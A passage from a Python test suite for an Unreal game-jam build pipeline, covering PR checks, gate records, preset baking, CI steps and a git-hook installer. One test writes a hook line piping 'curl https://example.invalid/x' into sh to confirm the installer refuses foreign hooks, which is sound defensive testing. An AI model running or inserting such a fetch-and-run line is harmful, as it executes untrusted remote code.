        rc, out = self.check_pr(re.sub(r"^.*SMOKE_EFFECTIVE at=end.*\n", "", body, flags=re.M), changed, "mvp2.json", head)
        self.assertEqual(rc, 1, out)
        self.assertIn("at=end", out)
        # final-10 A H1, broken on purpose: the stand-in reports only what reflection reaches. A marked field with no
        # UPROPERTY is not reflected, so the game leaves it out and the smoke fails (the stub never reports every marker)
        th = sb.path("Source", "UmbrellaElla", "Public", "Umbrella", "UmbrellaFlightTuning.h")
        good_h = read(th)
        write(th, good_h.replace('\tUPROPERTY(EditAnywhere, meta = (ToolTip = "cm/s^2", ClampMin = "400", ClampMax = "2600"))\n', ""))
        self.package("--allow-dirty")
        write(th, good_h)
        rc, hidden = self.smoke_output()
        self.assertEqual(rc, 1, hidden)
        self.assertIn("MOVE-21.fall_speed: marked in", hidden)
        self.package()
        self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names)
        self.merge_check("jam-start")
        self.stage_ci("mvp2")

    # ---------- a revert on main and a backfill daily (final-9 A H3) ----------
    def test_08_revert_and_backfill_keep_the_daily_green(self):
        sb = self.sb
        old = sb.git("rev-parse", "HEAD")
        wind = "UmbrellaElla.Flow.World.MenuBlocksGameplayInput"   # any one-test row a card marks merged
        sb.mark_merged("#31", wind)
        sb.commit("UE-31: a card that adds a test")
        self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names + "," + wind)
        # broken on purpose: the test vanishes while its row stays merged
        self.run_daily(expect=1, STUB_TESTS=0, STUB_NAMES=self.names)
        red = sb.git("rev-parse", "HEAD")
        sb.git("revert", "--no-edit", "HEAD")   # the documented main-red response (AGENTS.md section 6)
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names)
        self.assertIn("test=PASS(7/0/7)", line)
        # final-10 A H3: the PR lane_guard opens for that revert passes check_pr as written (no human rewrite)
        sys.path.insert(0, os.path.join(ROOT, "tools"))
        import lane_guard
        rev = sb.git("rev-parse", "HEAD")
        files = sb.git("diff", "--name-only", red, rev).split()
        body = lane_guard.revert_body(red, sb.git("log", "-1", "--format=%s", red), rev, files, "31", "Josh")
        rc, out = self.check_pr(body, files, "mvp2.json", rev, base=red)
        self.assertEqual(rc, 0, out)
        # broken on purpose: the same body naming another commit (its inverse is not this diff) fails
        rc, out = self.check_pr(body.replace(red, old), files, "mvp2.json", rev, base=red)
        self.assertEqual(rc, 1, out)
        self.assertIn("not exactly the inverse", out)
        sb.git("checkout", "-q", old)   # backfill: a daily on an older commit after later records exist
        self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names)
        sb.git("checkout", "-q", "main")
        self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names)

    # ---------- gates ----------
    def gate_record(self, gate, line, ui="ui_check ci: PASS (0 problem(s))", outcome="Pass", open_p01="none", extra="",
                    live=None):
        sb = self.sb
        sha = sb.git("rev-parse", "HEAD")
        due = {"G1": "survived pass | fail-retry pass | fail-bottom pass | quit-play pass | quit-title n/a | quit-pause n/a"}.get(
            gate, "survived pass | fail-retry pass | fail-bottom pass | quit-play pass | quit-title pass | quit-pause pass")
        with open(sb.path("Saved", "Logs", "pipeline", "daily-records.txt"), "a") as fh:
            fh.write(f"PLAYTHROUGH {sha} | {due}\n")
            if gate != "G1":   # from G2 --gate-record re-checks QA's UIFLOW line (quits, mouse in menus)
                fh.write(open(os.path.join(ROOT, "tests", "fixtures", "ui", "uiflow_pass.log")).read().splitlines()[-1]
                         .replace("commit=abc1234", f"commit={sha}") + "\n")
        rc, pt = sb.tool("tools/ue_run.py", "playthrough-check", "--commit", sha, "--gate", gate)
        self.assertEqual(rc, 0, pt)
        # final-9 A H7: the gate zip is the Win64 package script's output, zipped as built
        exe, _ = self.win_package(**({"STUB_LIVE": live} if live else {}))
        src = os.path.dirname(exe)
        zdir = os.path.join(sb.base, f"{gate}-{sha[:12]}")
        shutil.rmtree(zdir, ignore_errors=True)
        os.makedirs(zdir)
        zp = os.path.join(zdir, "UmbrellaTeam_UmbrellaOwl.zip")
        with zipfile.ZipFile(zp, "w") as z:
            for d, _, files in os.walk(src):
                for f in files:
                    z.write(os.path.join(d, f), os.path.relpath(os.path.join(d, f), src))
        rc, zline = sb.tool("tools/submission_check.py", "zip", zp, "--gate", gate)
        self.assertEqual(rc, 0, zline)
        zline = last_line(zline, r"^PASS: ")
        with open(zp, "rb") as fh:
            digest = hashlib.sha256(fh.read()).hexdigest()
        # final-9 B H5, A H4: re-downloaded and launched on Windows: the smoke of the unzipped zip writes LAUNCH
        dl = os.path.join(sb.base, f"dl-{gate}")
        shutil.rmtree(dl, ignore_errors=True)
        with zipfile.ZipFile(zp) as z:
            z.extractall(dl)
        os.chmod(os.path.join(dl, "UmbrellaElla.exe"), 0o755)
        rc, launch = self.smoke_output(os.path.join(dl, "UmbrellaElla.exe"), SMOKE_ZIP=zp)
        self.assertEqual(rc, 0 if not live else 1, launch)
        if live:   # the drifted binary never gets a LAUNCH line from the smoke; the record below has none for it
            pass
        else:
            self.assertIn(f"LAUNCH {digest}", launch)
        butler = "BUTLER version=v15.24.0 login=ok user=umbrella-team by=Rick"
        rc, out = sb.tool("tools/submission_check.py", "butler", butler)
        self.assertEqual(rc, 0, out)
        if gate == "G1":
            rc, out = sb.tool("tools/ui_check.py", "ci")
            self.assertEqual(rc, 0, out)
            ui = last_line(out, r"^ui_check ci: ")
        # the MVP items due at the gate, from the brief's [G<n>] tags (GDD SH1.0: G1 is MVP 1-6, D-new-sh10-g1)
        n = ", ".join(map(str, tools_mod("check_card").gate_mvp(sb.dir)[gate]))
        late = (int(CLOSED[gate][11:13]) * 60 + int(CLOSED[gate][14:16]) - int(CLOCK[gate][11:13]) * 60
                - int(CLOCK[gate][14:16])) / 60
        rec = read(os.path.join(FIX, "gates", "record.md")).format(
            gate=gate, due=CLOCK[gate], closed=CLOSED[gate], late=f"{late:.1f}", sha=sha[:7],
            mvp=", ".join(f"MVP {x} pass" for x in n.split(", ")), digest=digest, open_p01=open_p01,
            playthrough=last_line(pt, r"^PASS: PLAYTHROUGH"), daily=line, ui=ui, zip=zline, outcome=outcome)
        # final-9 A M2: the template pastes the --clock line first
        rec = self.clock_line + "\n" + rec + extra + (butler + "\n" if gate == "G1" else "")
        data = json.dumps({"body": "tracker", "comments": [{"createdAt": "2026-11-12T00:00:00Z", "body": rec}]})
        rc, out = sb.tool("tools/check_card.py", "--gate-record", stdin=data)
        return rc, out, rec

    def run_record(self, rec):
        data = json.dumps({"body": "tracker", "comments": [{"createdAt": "2026-11-12T00:00:00Z", "body": rec}]})
        return self.sb.tool("tools/check_card.py", "--gate-record", stdin=data)

    def test_09_g1(self):
        sb = self.sb
        mac = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names, SMOKE_REPEAT=5)
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names, SMOKE_REPEAT=5, win=True)
        self.assertIn("| RICK-PC/Windows 10 |", line)
        for entry in ("restart cycles (SMOKE_RESTART_CYCLES not set)", "client-test (CLIENT_TESTS=1 not set)",
                      "shipping-alive (SHIPPING_EXE not set", "reference host (REF_HOST not set",
                      "real-engine pipeline ("):
            self.assertIn(entry, line)
        self.assertIn("repeat 5/5", line)
        self.merge_check("jam-start")
        rc, out, rec = self.gate_record("G1", line)
        self.assertEqual(rc, 0, out)
        # final-9 B H4, broken on purpose: a DAILY line typed rather than recorded (a better test count)
        rc, out = self.run_record(rec.replace("test=PASS(7/0/7)", "test=PASS(8/0/8)"))
        self.assertEqual(rc, 1, out)
        self.assertIn("not a line of the machine record", out)
        # final-10 A H5, broken on purpose: the Mac daily of the same commit is a real record line, but not the Win64
        # packaging machine's
        rc, out = self.run_record(rec.replace(line, mac))
        self.assertEqual(rc, 1, out)
        self.assertIn("a gate's daily is", out)
        # final-10 A M1: --records adds the launch machine's file; this machine's record is still read
        other = os.path.join(sb.base, "rick-laptop-records.txt")
        write(other, "PLAYTHROUGH 0000000 | none\n")
        data = json.dumps({"body": "tracker", "comments": [{"createdAt": "2026-11-12T00:00:00Z", "body": rec}]})
        rc, out = sb.tool("tools/check_card.py", "--gate-record", "--records", other, stdin=data)
        self.assertEqual(rc, 0, out)
        sb.git("tag", "-a", "gate-G1", "-m", "G1")
        self.stage_ci("g1")

    # ---------- card 0.10a: a cooked map with no player (final-9 A H2) ----------
    def test_10_style_frame_map_keeps_the_daily_green(self):
        sb = self.sb
        p = sb.path("pipeline", "qa", "no-player-maps.txt")
        good = read(p) + "L_StyleFrame | 0.10a | style frame: swatch and anchors, no player\n"
        # broken on purpose first: the map cooked without its row fails the daily smoke (input=none on a gameplay map)
        copy_tree(os.path.join(FIX, "game", "s10a"), sb.dir)
        out = self.run_daily("--allow-dirty", expect=1, STUB_TESTS=0, STUB_NAMES=self.names)
        self.assertIn("smoke=FAIL(L_StyleFrame)", out)
        write(p, good)
        # card 0.10a's gate patch sets the mips rule before the first art import (D13's default while it is open)
        sp = sb.path("pipeline", "art", "style.json")
        write(sp, read(sp).replace('"mips": null,', '"mips": "mips",', 1))
        head = sb.commit("UE-0.10a: style frame map, its no-player-maps row, the D13 mips rule")
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names)
        self.assertIn("smoke=PASS(2 map(s))", line)
        rc, smoke = self.smoke_output(SMOKE_GAME_MAP="/Game/UmbrellaElla/Maps/L_StyleFrame", SMOKE_MAP="L_StyleFrame")
        self.assertEqual(rc, 0, smoke)
        # final-10 A H2: no player, but the hook reads GetDefault<UUmbrellaTuning>() as gameplay does: the keys are there
        self.assertIn("bake_preset effective: PASS keys=2", smoke)
        pkg = self.package()
        changed = ["Content/UmbrellaElla/Maps/L_StyleFrame.umap", "Config/DefaultGame.ini",
                   "pipeline/qa/no-player-maps.txt"]
        ev = f"commit={head} engine=5.8.4 config=Development host=mac run=packaged\n{pkg.strip()}\n{smoke.strip()}\n"
        body = pr_body("0.10a", 26, "Integrator", "Art Director", changed, ["swatch placed"], ev)
        rc, out = self.check_pr(body, changed, "0.10a.json", head)
        self.assertEqual(rc, 0, out)
        # card 0.10b's anchors land (a stand-in file here): the art bootstrap ends by itself, and from now on every
        # smoke's art_check, screen_check and art_judge result blocks (the stand-in game's screenshot is the key art)
        self.assertIn("art checks (no anchor art before card 0.10b", line)
        os.makedirs(sb.path("Content", "UmbrellaElla", "Art", "Anchors"), exist_ok=True)
        write(sb.path("Content", "UmbrellaElla", "Art", "Anchors", "README.txt"), "anchors (stand-in for card 0.10b)\n")
        sb.commit("UE-0.10b: anchors imported (stand-in)")
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names)
        self.assertNotIn("art checks", line)

    # ---------- card 0.21: the title screen (final-9 A H1, H6) ----------
    def test_11_title_screen_keeps_input_ok(self):
        sb = self.sb
        hook = sb.path("Source", "UmbrellaElla", "Private", "Smoke", "SmokeHook.cpp")
        copy_tree(os.path.join(FIX, "game", "s21"), sb.dir)
        write(hook, read(os.path.join(FIX, "game", "s06", "Source", "UmbrellaElla", "Private", "Smoke", "SmokeHook.cpp")))
        # broken on purpose: the title exists but the hook cannot pass it, so held input never reaches the umbrella
        self.package("--allow-dirty")
        rc, out = self.smoke_output()
        self.assertEqual(rc, 1, out)
        self.assertIn("input=none", out)
        copy_tree(os.path.join(FIX, "game", "s21"), sb.dir)
        sb.mark_merged("#33", "UmbrellaElla.Flow.TitleToPlayToSurvived")
        sb.commit("UE-0.21: menu and settings C++, the hook passes the title")
        type(self).names = self.names + ",UmbrellaElla.Flow.TitleToPlayToSurvived=31.0"
        # final-10 A H4: plain test.sh (what every card's Done-when runs) knows the Flow test is a world test from its
        # test-map `(world)` mark, the same way the daily does
        rc, t = self.sh("test.sh", STUB_TESTS=0, STUB_NAMES=self.names)
        self.assertEqual(rc, 0, t)
        self.assertIn("PASS  tests=", t)
        self.package()
        rc, out = self.smoke_output()
        self.assertEqual(rc, 0, out)
        self.assertIn("input=ok", out)
        self.assertIn("SMOKE_TITLE skipped=", read(last_line(out, r"^smoke logs: ").split()[-1]))
        old_ini = os.path.join(sb.base, "g1-GameUserSettings.ini")
        write(old_ini, "[/Script/Engine.GameUserSettings]\nFullscreenMode=1\n")
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names, CLIENT_TESTS=1, SETTINGS_OLD_INI=old_ini)
        self.assertIn("input=", line + "input=")   # GameDefaultMap smoke passed with the title in the build
        self.stage_ci("0.21")

    def test_12_g2_client_tests_on(self):
        sb = self.sb
        write(sb.path("Content", "UmbrellaElla", "UI", "WBP_Title.uasset"), "uasset placeholder\n")
        # the UI cards' text inputs, so `ui_check ci --release` passes on the tree: --gate-record re-runs it (A M5)
        ui = os.path.join(ROOT, "tests", "fixtures", "ui")
        shutil.copy(os.path.join(ui, "text_styles_pass.csv"), sb.path("Content", "UmbrellaElla", "UI", "text-styles.csv"))
        shutil.copy(os.path.join(ui, "strings_pass.csv"), sb.path("Content", "UmbrellaElla", "UI", "ST_UI.csv"))
        sb.commit("UE-0.21b: menu layouts")
        rc, out = sb.tool("tools/ui_check.py", "ci", "--release")
        self.assertEqual(rc, 0, out)
        self.assertIn(RELEASE_UI, out)
        old_ini = os.path.join(sb.base, "g1-GameUserSettings.ini")
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names, SMOKE_REPEAT=5, CLIENT_TESTS=1,
                              SETTINGS_OLD_INI=old_ini, win=True)
        self.assertIn("client-test=PASS", line)
        self.merge_check("gate-G1", "--require-client")
        rc, out, rec = self.gate_record("G2", line, ui=RELEASE_UI)
        self.assertEqual(rc, 0, out)
        # A switch past its gate is a P1 bug: a plain Pass fails (and a typed line is not the record's)
        off = line.replace("client-test=PASS", "client-test=NOT RUN").replace(
            " | Not checked: ", " | Not checked: client-test (CLIENT_TESTS=1 not set), ")
        rc, out = self.run_record(rec.replace(line, off))
        self.assertEqual(rc, 1, out)
        sb.git("tag", "-a", "gate-G2", "-m", "G2")

    def test_13_g3_restart_cycles_on(self):
        sb = self.sb
        old_ini = os.path.join(sb.base, "g1-GameUserSettings.ini")
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names, SMOKE_REPEAT=5, CLIENT_TESTS=1,
                              SMOKE_RESTART_CYCLES=5, SETTINGS_OLD_INI=old_ini, win=True)
        self.assertNotIn("restart cycles (", line)
        rc, out, _ = self.gate_record("G3", line, ui=RELEASE_UI)
        self.assertEqual(rc, 0, out)
        sb.git("tag", "-a", "gate-G3", "-m", "G3")

    def bake_sources(self):
        """Every flag and every built approved parameter with its `// bake:` marker at the GDD 1.3 start: the numbers
        in per-component F<Comp>Tuning headers (pipeline/unreal/gameplay-code.md), a `%` key in percent, the flag
        defaults in a .cpp table with EFeatureId tokens (pipeline/unreal-rules.md), the manifest version the
        harness was made from (final-9 A M4, M5, SC2, B M5)."""
        sys.path.insert(0, os.path.join(ROOT, "tools"))
        import bake_preset
        m = json.loads(read(self.sb.path("docs", "feature-manifest.json")))
        keys = sorted(bake_preset.required_keys(m))
        vals = m["approved_parameters"]["values"]
        flags = {f["feature_id"]: f["default_enabled"] for f in m["features"] if f.get("flag")}
        tokens = {f["feature_id"]: f["flag"] for f in m["features"] if f.get("flag")}
        params, by_feature = {}, {}
        for k in keys:
            if not k.endswith(".enabled"):
                params[k] = vals[k]["start"]
                by_feature.setdefault(k.partition(".")[0], []).append(k)
        # Each key goes into its component's F<Comp>Tuning struct that card 0.3 made a member of UUmbrellaTuning, so no
        # card edits Core/ or the smoke hook (final-10 A H1). UMB-01 is already marked by MVP 2.
        comp = {"CORE-01": "Motor", "CORE-02": "Motor", "WIND-01": "Motor", "CORE-03": "Health", "SURV-03": "Health",
                "COM-01": "Attack", "DEF-01": "Defense", "OWL-01": "Encounter", "END-01": "Encounter",
                "ANIM-01": "Feedback", "BG-01": "Feedback", "FLOW-01": "Feedback"}
        per = {}
        for fid, ks in sorted(by_feature.items()):
            ks = [k for k in ks if k not in ("MOVE-21.rise_speed", "MOVE-21.fall_speed")]   # MVP 2 marked these
            # GDD SH1.0 Rule IDs: the component by prefix (pipeline/unreal/gameplay-code.md modules)
            c = comp.get(fid) or {"MOVE": "Motor", "WIND": "Motor", "SURV": "Health", "UMB": "Health", "COM": "Attack",
                                  "OWL": "Encounter", "FLOW": "Feedback", "HAZ": "Encounter"}.get(fid.split("-")[0])
            self.assertTrue(c, f"bake_sources: no component for {fid}")
            for k in ks:   # final-11 A H4: card 0.21 (menu and settings) marks the master volume in FUITuning
                per.setdefault("UI" if k == "FLOW-37.master_volume" else c, []).append(k)
        for c, ks in sorted(per.items()):
            lines = ["#pragma once", "", "#include \"CoreMinimal.h\"", f"#include \"{c}Tuning.generated.h\"", "",
                     "USTRUCT()", f"struct F{c}Tuning", "{", "\tGENERATED_BODY()", ""]
            for k in ks:
                v = vals[k]["start"]
                fid = k.partition(".")[0].replace("-", "")
                ident = fid.title() + "".join(w[:1].upper() + w[1:].lower() for w in re.split(r"[_]", k.partition(".")[2]) if w)
                seed = k.endswith("seed")
                lit = str(int(v)) if seed else f"{float(v)!r}f"
                lines += ["\tUPROPERTY(EditAnywhere)", f"\t{'int32' if seed else 'float'} {ident} = {lit};   // bake: {k}", ""]
            lines += ["};", ""]
            write(self.sb.path("Source", "UmbrellaElla", "Public", c, f"{c}Tuning.h"), "\n".join(lines))
        fl = ["#include \"Harness/FeatureFlags.h\"", "", "// Card 0.27: one flag per manifest record, at its default.",
              f"const TCHAR* GManifestVersion = TEXT(\"{m['manifest_version']}\");", "",
              "static const FFeatureFlagDefault FeatureFlagDefaults[] =", "{"]
        for fid in sorted(flags):
            fl.append(f"\t{{ EFeatureId::{tokens[fid]}, {'true' if flags[fid] else 'false'} }},   // bake: {fid}.enabled")
        fl += ["};", ""]
        write(self.sb.path("Source", "UmbrellaElla", "Private", "Harness", "FeatureFlags.cpp"), "\n".join(fl))
        write(self.sb.path("Source", "UmbrellaElla", "Public", "Harness", "FeatureFlags.h"),
              "#pragma once\n\n#include \"CoreMinimal.h\"\n\nstruct FFeatureFlagDefault\n{\n\tint32 Id;\n\tbool bOn;\n};\n")
        return params, flags, m["manifest_version"]

    def test_14_g4_bake_and_record(self):
        sb = self.sb
        params, flags, mv = self.bake_sources()
        self.assertIn("610.0f;   // bake: MOVE-21.free_fall_speed", read(sb.path(
            "Source", "UmbrellaElla", "Public", "Motor", "MotorTuning.h")))
        sb.commit("UE-0.27: workbench in the game build")
        rc, out = sb.tool("tools/bake_preset.py", "defaults")
        self.assertEqual(rc, 0, out)
        old_ini = os.path.join(sb.base, "g1-GameUserSettings.ini")
        self.package()
        self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names, CLIENT_TESTS=1, SETTINGS_OLD_INI=old_ini)
        export = os.path.join(sb.base, "config-T-01.json")
        write(export, json.dumps({"kind": "workbench_config", "preset": "T-01", "commit": sb.git("rev-parse", "HEAD"),
                                  "manifest_version": mv, "flags": flags, "params": params}, indent=1))
        for args in (("validate", export), ("bake", export)):
            rc, out = sb.tool("tools/bake_preset.py", *args)
            self.assertEqual(rc, 0, out)
        sb.commit("UE-60: G4 bake of T-01")
        rc, out = sb.tool("tools/bake_preset.py", "check", "--complete")
        self.assertEqual(rc, 0, out)
        rec_file = os.path.join(sb.base, "g4.md")
        write(rec_file, "Baked preset: T-01\n")
        rc, bake_line = sb.tool("tools/bake_preset.py", "check", "--record", rec_file)
        self.assertEqual(rc, 0, bake_line)
        bake_line = last_line(bake_line, r"^bake_preset check: PASS")
        self.package()
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names, SMOKE_REPEAT=5, CLIENT_TESTS=1,
                              SMOKE_RESTART_CYCLES=5, SETTINGS_OLD_INI=old_ini, win=True)
        self.merge_check("gate-G3", "--require-client")
        extra = ("Final upload: 2026-11-15T14:30-08:00\n"
                 f"Baked preset: T-01 | approved by Richard https://github.com/x/y/issues/1#c9 | {bake_line}\n")
        rc, out, rec = self.gate_record("G4", line, ui=RELEASE_UI, extra=extra)
        self.assertEqual(rc, 0, out)
        # final-9 B C1, broken on purpose: a LAUNCH line whose live value drifted from the bake fails the G4 tie
        records = sb.path("Saved", "Logs", "pipeline", "daily-records.txt")
        good = read(records)
        launch = [ln for ln in good.splitlines() if ln.startswith("LAUNCH ")][-1]
        write(records, good.replace(launch, launch.replace("EncounterTuning.Owl08ClockHp=320", "EncounterTuning.Owl08ClockHp=200")))
        rc, out = self.run_record(rec)
        write(records, good)
        self.assertEqual(rc, 1, out)
        self.assertIn("OWL-08.clock_hp: the running game has 200", out)
        # final-10 B H2, broken on purpose: the G4 tie rejects a workbench=1 launch, as check_pr does
        write(records, good.replace(launch, launch.replace("workbench=0", "workbench=1")))
        rc, out = self.run_record(rec)
        write(records, good)
        self.assertEqual(rc, 1, out)
        self.assertIn("workbench=1 build", out)
        # and the drifted binary itself fails its launch smoke, so it never gets a LAUNCH line
        rc, out, bad_rec = self.gate_record("G4", line, ui=RELEASE_UI, extra=extra, live="OWL-08.clock_hp=200")
        self.assertEqual(rc, 1, out)
        bad_zip = os.path.join(sb.base, f"G4-{sb.git('rev-parse', 'HEAD')[:12]}", "UmbrellaTeam_UmbrellaOwl.zip")
        with open(bad_zip, "rb") as fh:
            bad_digest = hashlib.sha256(fh.read()).hexdigest()
        # final-10 B H1, broken on purpose: the good LAUNCH line "fixed" to the drifted zip's sha256 fails: the zip
        # member it names does not have the recorded exe_sha256
        with open(records, "a") as fh:
            fh.write(re.sub(r"^LAUNCH [0-9a-f]{64}", f"LAUNCH {bad_digest}", launch) + "\n")
        rc, out = self.run_record(bad_rec)
        write(records, good)
        self.assertEqual(rc, 1, out)
        self.assertIn("exe_sha256", out)
        # final-10 B H2, broken on purpose: a clean build smoked with SMOKE_ZIP set to the drifted zip writes no LAUNCH
        exe, _ = self.win_package()
        rc, out = self.smoke_output(exe, SMOKE_ZIP=bad_zip)
        self.assertEqual(rc, 1, out)
        self.assertIn("is not a file of", out)
        self.assertNotIn(f"LAUNCH {bad_digest}", read(records))
        self.stage_ci("g4")

    # ---------- CI on the final tree, with the jam's own files ----------
    def test_15_ci_commands_on_the_jam_tree(self):
        sb = self.sb
        shutil.copy(sb.path("pipeline", "templates", "clock-workflow.yml"), sb.path(".github", "workflows", "clock.yml"))
        write(sb.path("pipeline", "unreal", "editor_scripts", "dump_owl.py"),
              '"""Card 0.8a: dump every owl pattern and phase asset as encounter.json JSON."""\n')
        write(sb.path("scratch", "smoke-josh.txt"), "card 0.9 smoke notes\n")
        write(sb.path("Samples", "Workbench", "README.md"), "# Workbench sample\nCommands that made it.\n")
        rc, out = sb.tool("tools/export_package.py")   # rebuild the readable package (known: doc edits make it stale)
        self.assertEqual(rc, 0, out)
        sb.commit("jam files")
        wf = read(sb.path(".github", "workflows", "pipeline-checks.yml"))
        wf = wf.split("\n  windows:\n")[0]   # the windows job's PowerShell steps run on windows-latest, not under bash
        steps = re.findall(r"- name: (.*?)\n((?:        .*\n|\n)*?)(?=      - |\Z)", wf)
        ran = 0
        for name, block in steps:
            if "github.event_name == 'pull_request'" in block or "lfs pull" in block or "unittest" in block:
                continue   # the unit-test step runs in test_16 on each stage's tree
            m = re.search(r"run: \|\n((?:          .*\n)+)|run: (.*)\n", block)
            if not m:
                continue
            cmd = m.group(1) or m.group(2)
            cmd = re.sub(r"\$\{\{ github\.event_name \}\}", "push", cmd)
            cmd = re.sub(r"\$\{\{ [^}]+ \}\}", "", cmd)
            with self.subTest(step=name.strip()):
                p = subprocess.run(["bash", "-e", "-c", cmd], cwd=sb.dir, capture_output=True, text=True,
                                   env=dict(os.environ, BASE="", RUNNER_TEMP=sb.base), timeout=600)
                self.assertEqual(p.returncode, 0, p.stdout[-3000:] + p.stderr[-2000:])
                ran += 1
        self.assertGreaterEqual(ran, 12)
        self.stage_ci("final")

    # ---------- the CI unit-test step on each stage's tree (dry run A C1) ----------
    def test_16_unit_test_step_green_at_every_stage(self):
        self.assertGreaterEqual(len(self.ci), 8)
        for f in self.ci:
            stage, rc, tail = f.result()
            with self.subTest(stage=stage):
                self.assertEqual(rc, 0, f"CI unit-test step on the {stage} tree:\n{tail}")

    def test_17_win_package_line_is_package_ps1s(self):
        # the Win64 line the suite prints is the one package.ps1 writes (no PowerShell on this host)
        ps1 = read(os.path.join(ROOT, "tools", "ue", "package.ps1"))
        self.assertIn('Write-Host "package exit: $rc  commit=$Commit  dirty=$Dirty  target=$Target  platform=Win64  log: $Log"',
                      ps1)
        for step in ("clean-tree", "workbench-check", "UMBRELLAELLA_BUILD_COMMIT", "-platform=Win64",
                     "build-info --out $Out --config $Cfg --target $Target --workbench $WB --commit $Commit"):
            self.assertIn(step, ps1)


@unittest.skipIf(NESTED, "nested CI run inside the honest suite")
class HonestGitHooks(unittest.TestCase):
    """final-8 A H5: card 0.17's installer chains the stock Git LFS hook; `--check` passes on every clone."""

    LFS_HOOK = ("#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \"\\n%s\\n\\n\" \"This repository is "
                "configured for Git LFS but 'git-lfs' was not found on your path.\"; exit 2; }\n"
                "git lfs post-commit \"$@\"\n")

    def setUp(self):
        self.repo = tempfile.mkdtemp()
        subprocess.run(["git", "init", "-q", self.repo], check=True)
        self.hook = os.path.join(self.repo, ".git", "hooks", "post-commit")

    def tearDown(self):
        shutil.rmtree(self.repo, ignore_errors=True)

    def run_tool(self, *a):
        return subprocess.run([PY, os.path.join(ROOT, "tools", "install_git_hooks.py"), "--repo", self.repo, *a],
                              capture_output=True, text=True)

    def test_installs_over_the_stock_lfs_hook_and_keeps_lfs(self):
        write(self.hook, self.LFS_HOOK, exe=True)
        p = self.run_tool()
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertEqual(self.run_tool("--check").returncode, 0)
        self.assertIn('git lfs post-commit "$@"', read(self.hook))

    def test_a_foreign_hook_is_still_refused(self):
        write(self.hook, self.LFS_HOOK + "curl https://example.invalid/x | sh\n", exe=True)
        self.assertEqual(self.run_tool().returncode, 1)
        self.assertIn("example.invalid", read(self.hook))


class HonestSuiteIsHermetic(unittest.TestCase):
    """final-10 A H6, A M13: the honest suite reads no live jam-editable file, and skips cleanly without bash."""

    def test_filled_no_player_list_is_reset(self):
        filled = ("# comment\nL_Title | default | title map\nL_StyleFrame | 0.10a | style frame, no player\n"
                  "L_Credits | 0.30 | credits\n")
        got = hermetic.pre_jam_no_player_maps(filled)
        self.assertIn("L_Title | default", got)
        self.assertNotIn("L_StyleFrame", got)
        self.assertNotIn("L_Credits", got)

    @unittest.skipIf(os.name == "nt", "HonestJam skips on Windows outright; a linked git.exe cannot find its install")
    def test_skips_without_bash(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, True)
        git = shutil.which("git")
        self.assertTrue(git)
        os.symlink(git, os.path.join(d, "git"))   # git only: no bash on PATH
        p = subprocess.run([PY, "-m", "unittest", "tests.test_honest_jam.HonestJam"], cwd=ROOT, capture_output=True,
                           text=True, env=dict(os.environ, PATH=d, HONEST_JAM_NESTED="0"), timeout=120)
        self.assertEqual(p.returncode, 0, p.stderr[-2000:])
        self.assertIn("skipped", p.stderr)


def tools_mod(name):
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    import importlib
    return importlib.import_module(name)


class Final11HonestFixes(unittest.TestCase):
    """Final-11 dry run A: the honest-team highs H1-H5 and the cheap mediums M1, M3, M4. Each has a passing case and
    a broken-on-purpose case where the check's answer changes."""

    def tmp(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, True)
        return d

    # ---------- H1: the hook enumerates flags and manifest= through the card 0.3 seam ----------
    def game_root(self):
        root = self.tmp()
        for rel in ("docs/feature-manifest.json", "docs/decisions.md", "pipeline/qa/presets.json"):
            os.makedirs(os.path.dirname(os.path.join(root, rel)), exist_ok=True)
            shutil.copy(os.path.join(ROOT, rel), os.path.join(root, rel))
        copy_tree(os.path.join(FIX, "game", "s03"), root)
        copy_tree(os.path.join(FIX, "game", "s06"), root)
        return root

    def flag_table(self, root):
        """Card 0.27: the flag table and manifest version, in Harness/ only."""
        m = json.loads(read(os.path.join(root, "docs", "feature-manifest.json")))
        fl = ['#include "Harness/HarnessSubsystem.h"', "",
              f'const TCHAR* GManifestVersion = TEXT("{m["manifest_version"]}");', "",
              "static constexpr FFeatureFlagDefault FeatureFlagDefaults[] =", "{"]
        for f in m["features"]:
            if f.get("flag"):
                fl.append(f"\t{{ EFeatureId::{f['flag']}, {'true' if f['default_enabled'] else 'false'} }},   "
                          f"// bake: {f['feature_id']}.enabled")
        write(os.path.join(root, "Source", "UmbrellaElla", "Private", "Harness", "FeatureFlags.cpp"),
              "\n".join(fl + ["};", ""]))

    def effective(self, root):
        exe = os.path.join(root, "out", "game.sh")
        p = subprocess.run([PY, os.path.join(FIX, "compile_stub.py"), root, os.path.join(FIX, "game.sh"), exe,
                            "UmbrellaElla", "Win64"], capture_output=True, text=True,
                           env=dict(os.environ, UMBRELLAELLA_BUILD_COMMIT="abc1234"))
        self.assertEqual(p.returncode, 0, p.stderr)
        log = os.path.join(root, "out", "game.log")
        subprocess.run(["bash", exe, f"-abslog={log}"], capture_output=True, timeout=60)
        bp = tools_mod("bake_preset")
        with contextlib.redirect_stdout(io.StringIO()) as out:
            rc = bp.main(["--root", root, "effective", log])
        return rc, out.getvalue()

    @unittest.skipIf(shutil.which("bash") is None, "the stand-in game is a bash script")
    @unittest.skipIf(os.name == "nt", "the stand-in game is a bash script; `bash` on Windows is the WSL launcher")
    def test_h1_flags_and_manifest_need_no_hook_edit(self):
        root = self.game_root()
        rc, out = self.effective(root)
        self.assertEqual(rc, 0, "card 0.6 on the 0.3 seam (no flags yet):\n" + out)
        hook = os.path.join(root, "Source", "UmbrellaElla", "Private", "Smoke", "SmokeHook.cpp")
